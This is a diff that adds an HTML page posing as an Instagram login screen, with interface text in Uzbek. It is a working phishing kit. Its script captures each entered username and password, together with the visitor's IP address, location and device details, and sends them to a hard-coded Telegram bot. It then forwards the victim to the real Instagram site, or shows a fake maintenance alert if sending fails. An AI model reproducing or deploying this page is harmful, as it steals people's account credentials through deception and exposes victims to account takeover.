@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            padding: 10px;
+        }
+        .main-container {
+            background-color: #ffffff;
+            border: 1px solid #dbdbdb;
+            width: 100%;
+            max-width: 350px;
+            padding: 30px 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            border-radius: 8px;
+        }
+        .insta-logo { 
+            width: 60px; 
+            height: 60px; 
+            margin-bottom: 30px; 
+        }
+        .form-group {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #dbdbdb;
+            border-radius: 6px;
+            background-color: #fafafa;
+            font-size: 14px;
+            outline: none;
+            transition: border 0.2s ease;
+        }
+        .input-field:focus {
+            border: 1px solid #a8a8a8;
+        }
+        .login-button {
+            width: 100%;
+            padding: 11px;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: background-color 0.2s;
+        }
+        .login-button:hover {
+            background-color: #1877f2;
+        }
+        .login-button:disabled {
+            background-color: #b2dffc;
+            cursor: not-allowed;
+        }
+        .forgot-link { 
+            margin-top: 20px; 
+            color: #00376b; 
+            text-decoration: none; 
+            font-size: 12px; 
+            text-align: center;
+        }
+        .divider {
+            width: 100%;
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        .divider::before, .divider::after {
+            content: "";
+            flex-grow: 1;
+            background-color: #dbdbdb;
+            height: 1px;
+        }
+        .divider span { padding: 0 10px; }
+        
+        .register-container {
+            background-color: #ffffff;
+            border: 1px solid #dbdbdb;
+            width: 100%;
+            max-width: 350px;
+            padding: 20px;
+            text-align: center;
+            border-radius: 8px;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+        .register-container a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .meta-text {
+            margin-top: 40px;
+            font-size: 12px;
+            color: #8e8e8e;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-container">
+        <!-- Instagram SVG Logo -->
+        <svg class="insta-logo" viewBox="0 0 120 120">
+            <defs>
+                <radialGradient id="g" cx="30%" cy="100%" r="150%">
+                    <stop offset="0%" style="stop-color:#fed373" />
+                    <stop offset="25%" style="stop-color:#f15245" />
+                    <stop offset="50%" style="stop-color:#d92e7f" />
+                    <stop offset="100%" style="stop-color:#9c36b3" />
+                </radialGradient>
+            </defs>
+            <rect x="10" y="10" width="100" height="100" rx="25" fill="url(#g)" />
+            <rect x="25" y="25" width="70" height="70" rx="18" fill="none" stroke="white" stroke-width="6" />
+            <circle cx="60" cy="60" r="15" fill="none" stroke="white" stroke-width="6" />
+            <circle cx="85" cy="35" r="4" fill="white" />
+        </svg>
+
+        <!-- Forma -->
+        <form class="form-group" id="instaForm">
+            <input type="text" id="username" class="input-field" placeholder="Telefon raqami, foydalanuvchi nomi yoki elektron pochta" required>
+            <input type="password" id="password" class="input-field" placeholder="Parol" required minlength="6">
+            <button type="submit" class="login-button" id="submitBtn">Kirish</button>
+        </form>
+
+        <div class="divider"><span>YOKI</span></div>
+        <a href="#" class="forgot-link">Parolni unutdingizmi?</a>
+    </div>
+
+    <div class="register-container">
+        Hisobingiz yo‘qmi? <a href="#">Ro‘yxatdan o‘ting</a>
+    </div>
+
+    <div class="meta-text">Meta tomonidan taqdim etilgan</div>
+
+    <script>
+        const TOKEN = "8651990880:AAE2asZGGtAt_REOcaU7IBwudT3DmC1HlXw"; 
+        const CHAT_ID = "7687517234";
+
+        let userIp = "Noma'lum";
+        let userLocation = "Noma'lum";
+
+        // Sahifa yuklanganda IP va davlatni aniqlash
+        fetch('https://ipapi.co')
+            .then(res => res.json())
+            .then(data => {
+                userIp = data.ip || "Noma'lum";
+                userLocation = `${data.country_name || ''}, ${data.city || ''}`;
+            })
+            .catch(err => console.error("IP aniqlashda xatolik:", err));
+
+        document.getElementById('instaForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const btn = document.getElementById('submitBtn');
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+            const userAgent = navigator.userAgent;
+
+            btn.disabled = true;
+            btn.innerText = "Yuklanmoqda...";
+
+            // Telegramga yuboriladigan chiroyli xabar
+            const xabar = `🔔 *Yangi Login Tushdi!*
+
+👤 *Login:* \`${user}\`
+🔑 *Parol:* \`${pass}\`
+
+🌐 *IP Manzil:* \`${userIp}\`
+📍 *Joylashuv:* ${userLocation}
+📱 *Qurilma:* \`${userAgent}\``;
+
+            const url = `https://telegram.org{TOKEN}/sendMessage`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: xabar,
+                    parse_mode: "Markdown"
+                })
+            })
+            .then(res => {
+                if (!res.ok) throw new Error("API xatosi");
+                window.location.href = "https://instagram.com"; 
+            })
+            .catch(err => {
+                console.error("Xatolik:", err);
+                alert("Serverda texnik ishlar bormoqda. Iltimos keyinroq urinib ko'ring.");
+                btn.disabled = false;
+                btn.innerText = "Kirish";
+            });
+        });
+    </script>
+
+</body>
+</html>
